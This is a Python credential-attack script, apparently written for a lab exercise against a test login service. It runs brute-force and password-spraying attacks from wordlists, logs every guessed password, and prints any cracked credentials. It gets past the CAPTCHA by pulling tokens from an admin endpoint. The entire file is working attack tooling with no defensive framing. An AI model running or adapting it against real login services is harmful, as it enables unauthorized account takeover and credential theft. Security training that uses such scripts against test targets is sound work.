import requests
import time
import datetime
import json
import os

CONFIG_FILE = "attacker_config.json"
CAPTCHA_TOKEN = None

def load_config():
    if not os.path.exists(CONFIG_FILE):
        raise FileNotFoundError(f"Config file '{CONFIG_FILE}' not found")
    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)


def init_log_file(log_file):
    try:
        # Open in append mode just to create it if it doesn't exist
        with open(log_file, 'a', encoding='utf-8'):
            pass
    except Exception as e:
        print(f"Error initializing log file: {e}")


def log_attempt(config, username, password, status_code, result, latency, attack_type):
    log_entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "group_seed": config["group_seed"],
        "username": username,
        "password_attempt": password,
        "attack_type": attack_type,
        "status_code": status_code,
        "result": result,
        "latency_ms": float(f"{latency:.3f}")
    }

    try:
        with open(config["log_file"], 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry) + "\n")
    except Exception as e:
        print(f"Error writing to log: {e}")


def load_list_from_file(file_path, max_items=None):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File '{file_path}' not found")

    items = []
    try:
        # supports different languages in case of latin chars
        for encoding in ['utf-8', 'latin-1']:
            try:
                with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                    items = [line.strip() for line in f if line.strip()]
                break
            except UnicodeDecodeError:
                continue

        if max_items and max_items > 0:
            items = items[:max_items]

        print(f"Loaded {len(items)} items from {file_path}")
        return items
    except Exception as e:
        raise RuntimeError(f"Error loading file: {e}")


def solve_captcha(config):
    base_url = config["target_url"].replace("/login", "")
    admin_url = f"{base_url}/admin/get_captcha_token"

    try:
        params = {"group_seed": config["group_seed"]}
        response = requests.get(admin_url, params=params, timeout=5)

        if response.status_code == 200:
            token = response.json().get("captcha_token")
            return token
        else:
            print(f"[ERROR] Failed to get CAPTCHA token. Status: {response.status_code}")
            return None
    except Exception as e:
        print(f"[ERROR] Exception while solving CAPTCHA: {e}")
        return None


def attempt_login(config, username, password, attack_type):
    global CAPTCHA_TOKEN
    start_time = time.time()
    status_code = 0
    result = "ERROR"
    payload = {"username": username, "password": password, "captcha_token": CAPTCHA_TOKEN} if CAPTCHA_TOKEN else {"username": username, "password": password}

    try:
        response = requests.post(
            config["target_url"],
            json=payload,
            timeout=config.get("request_timeout", 5)
        )
        status_code = response.status_code
        if status_code == 200:
            result = "SUCCESS"
        elif status_code == 401:
            result = "FAILURE"
        elif status_code == 403:
            result = "LOCKED"
        elif status_code == 429:
            result = "RATE_LIMIT"
        else:
            result = f"UNKNOWN_{status_code}"
        try:
            resp_json = response.json()
            if resp_json.get("captcha_required", False):
                CAPTCHA_TOKEN = solve_captcha(config)
                result = f"Solved CAPTCHA, CAPTCHA_TOKEN: {CAPTCHA_TOKEN}"
                attempt_login(config, username, password, attack_type)
        except ValueError:
            pass
    except requests.exceptions.RequestException as e:
        print(f"Connection Error: {e}")
        time.sleep(15)

    end_time = time.time()
    latency_ms = (end_time - start_time) * 1000
    log_attempt(config, username, password, status_code, result, latency_ms, attack_type)

    # print(f"Status: {status_code} | User: {username} | Pass: {password} | ({latency_ms:.3f}ms)")
    return result == "SUCCESS"


def run_brute_force(config):
    target_user = config["target_username"]
    password_file = config["password_file"]
    max_attempts = config.get("max_attempts", 0)
    print(f"Starting brute force attack on user: {target_user}")
    passwords = load_list_from_file(password_file, max_attempts)
    for password in passwords:
        is_success = attempt_login(config, target_user, password, "Brute-Force")
        if is_success:
            print(f"SUCCESS! PASSWORD FOUND: {password}")
            break
    print("Brute force attack finished")


def run_password_spraying(config):
    user_file = config["user_file"]
    password_file = config["password_file"]
    max_passwords = config.get("max_attempts", 0)

    print(f"Starting password spraying attack")
    users = load_list_from_file(user_file)
    passwords = load_list_from_file(password_file, max_passwords)

    active_users = list(users)

    for password in passwords:
        if not active_users:
            print("All users cracked! Stopping.")
            break

        # print(f"Spraying password: {password}")

        for user in list(active_users):
            is_success = attempt_login(config, user, password, "Password-Spraying")

            if is_success:
                print(f"SUCCESS! LOGIN CREDS: {user} : {password}")
                # removing user from list after successfully logging in
                active_users.remove(user)

    print("Password spraying attack finished")
    print(f"Remaining uncracked users: {active_users}")


if __name__ == "__main__":
    config = load_config()
    init_log_file(config["log_file"])
    mode = config.get("attack_mode", "brute-force").lower()
    if mode == "password_spraying":
        run_password_spraying(config)
    else:
        run_brute_force(config)
